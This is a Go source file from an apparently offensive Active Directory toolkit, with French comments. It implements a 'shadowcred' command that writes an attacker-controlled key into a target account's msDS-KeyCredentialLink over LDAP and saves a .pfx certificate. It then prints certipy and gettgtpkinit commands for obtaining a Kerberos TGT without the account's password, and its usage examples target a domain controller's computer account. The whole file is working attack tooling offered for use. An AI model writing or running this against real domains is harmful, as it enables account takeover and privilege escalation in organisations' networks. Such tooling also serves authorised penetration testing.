// cmd/adgo/commands/shadowcred_cmd.go
//
// adgo ldap shadowcred — Shadow Credentials attack
//
// Principe : écrire une clé publique dans msDS-KeyCredentialLink d'un compte.
// Ensuite utiliser la clé privée pour obtenir un TGT via PKINIT.
// Nécessite : GenericWrite ou WriteProperty sur le compte cible.
//
// Équivalent de : pywhisker.py -t TARGET -a add

package commands

import (
	"context"
	"fmt"
	"strings"

	"adgo/pkg/adattack"
	"adgo/pkg/common"
	"adgo/pkg/ldap"

	"github.com/spf13/cobra"
)

var ShadowCredCmd = &cobra.Command{
	Use:   "shadowcred",
	Short: "Shadow Credentials — write a key to msDS-KeyCredentialLink",
	Long: `Shadow Credentials attack (pywhisker equivalent).

Writes an RSA public key into the target's msDS-KeyCredentialLink attribute.
The corresponding private key + self-signed cert can be used for PKINIT auth,
obtaining a TGT without knowing the account's password.

Requirements:
  - GenericWrite or WriteProperty on the target object

After adding shadow credential:
  certipy auth -pfx ./shadow_<target>.pfx -dc-ip <DC_IP>
  # or
  adgo kerberos getTGT --pfx shadow_<target>.pfx -d <DOMAIN> --dc-ip <DC_IP>

Examples:
  # Add shadow credential to a user
  adgo ldap shadowcred --dc-ip 192.168.1.10 -u admin -p pass -d LAB --target john

  # Add to a computer account
  adgo ldap shadowcred --dc-ip 192.168.1.10 -u admin -p pass -d LAB --target DC01$

  # List existing shadow credentials
  adgo ldap shadowcred --dc-ip 192.168.1.10 -u admin -p pass -d LAB --target john --list

  # Remove a specific key
  adgo ldap shadowcred --dc-ip 192.168.1.10 -u admin -p pass -d LAB --target john --remove <KeyID>`,
	RunE: runShadowCred,
}

var (
	shadowTarget    string
	shadowList      bool
	shadowRemoveKey string
	shadowOutDir    string
)

func init() {
	ShadowCredCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	ShadowCredCmd.Flags().StringVar(&shadowTarget, "target", "", "Target account (user or computer$) (required)")
	ShadowCredCmd.Flags().BoolVar(&shadowList, "list", false, "List existing shadow credentials on target")
	ShadowCredCmd.Flags().StringVar(&shadowRemoveKey, "remove", "", "Remove a specific KeyID from msDS-KeyCredentialLink")
	ShadowCredCmd.Flags().StringVar(&shadowOutDir, "output", ".", "Directory to save the .pfx file")
	ShadowCredCmd.MarkFlagRequired("target")

	LDAPCmd.AddCommand(ShadowCredCmd)
}

func runShadowCred(cmd *cobra.Command, args []string) error {
	ctx := context.Background()
	dcIP, _ := cmd.Flags().GetString("dc-ip")

	creds, err := requireCredsWithDCIP(dcIP)
	if err != nil {
		return err
	}

	server := buildLDAPServer(dcIP, creds)
	if server == "" {
		return fmt.Errorf("--dc-ip required")
	}

	common.PrintInfo(fmt.Sprintf("Shadow Credentials → %s as %s\\%s",
		server, strings.ToUpper(creds.SMBDomain), creds.SMBUsername))

	ldapClient, err := ldap.NewClientNTLM(ctx, server, creds.SMBDomain, creds.SMBUsername,
		creds.Password, creds.NTLMHash, false)
	if err != nil {
		return fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer ldapClient.Close()

	baseDN := buildBaseDN(creds)
	sc := adattack.NewShadowCredClient(ldapClient.Conn(), baseDN)

	switch {
	case shadowList:
		// Lister les clés existantes
		keys, err := sc.ListShadowCreds(shadowTarget)
		if err != nil {
			return fmt.Errorf("list failed: %v", err)
		}
		if len(keys) == 0 {
			common.PrintWarning(fmt.Sprintf("No shadow credentials on %s", shadowTarget))
			return nil
		}
		common.PrintSuccess(fmt.Sprintf("Shadow credentials on %s:", shadowTarget))
		for _, k := range keys {
			fmt.Printf("  KeyID: %s\n", k.KeyID)
			fmt.Printf("  Owner: %s\n", k.Owner)
			fmt.Printf("  Added: %s\n\n", k.KeyID)
		}

	case shadowRemoveKey != "":
		// Supprimer une clé spécifique
		if err := sc.RemoveShadowCred(shadowTarget, shadowRemoveKey); err != nil {
			return fmt.Errorf("remove failed: %v", err)
		}
		common.PrintSuccess(fmt.Sprintf("Shadow credential %s removed from %s",
			shadowRemoveKey[:8]+"...", shadowTarget))

	default:
		// Ajouter une shadow credential
		common.PrintInfo(fmt.Sprintf("Adding shadow credential to: %s", shadowTarget))
		result, err := sc.AddShadowCred(shadowTarget)
		if err != nil {
			return fmt.Errorf("shadow credential add failed: %v", err)
		}

		common.PrintSuccess(fmt.Sprintf("Shadow credential added to %s!", shadowTarget))
		fmt.Println()
		common.PrintFound("KeyID", result.KeyID[:16]+"...")
		common.PrintFound("Certificate", result.CachePath)
		common.PrintFound("NT hash", func() string {
			if result.NTHash != "" {
				return result.NTHash
			}
			return "(not available — use PKINIT)"
		}())
		fmt.Println()

		// Instructions d'exploitation
		domain := strings.ToUpper(creds.SMBDomain)
		common.PrintSuccess("Exploitation:")
		fmt.Printf("  # Authenticate with PKINIT to get TGT:\n")
		fmt.Printf("  certipy auth -pfx %s -dc-ip %s\n", result.CachePath, dcIP)
		fmt.Printf("\n  # Or with gettgtpkinit:\n")
		fmt.Printf("  python3 gettgtpkinit.py -cert-pfx %s %s/%s ccache.ccache\n",
			result.CachePath, domain, shadowTarget)
		fmt.Println()
		fmt.Printf("  # Cleanup after use:\n")
		fmt.Printf("  adgo ldap shadowcred --dc-ip %s -u %s -d %s --target %s --remove %s\n",
			dcIP, creds.SMBUsername, creds.SMBDomain, shadowTarget, result.KeyID[:8]+"...")

		// Log dans la session
		common.LogSuccess(shadowTarget, "Shadow credential added",
			map[string]interface{}{
				"key_id":   result.KeyID,
				"pfx_path": result.CachePath,
			},
		)
	}

	return nil
}
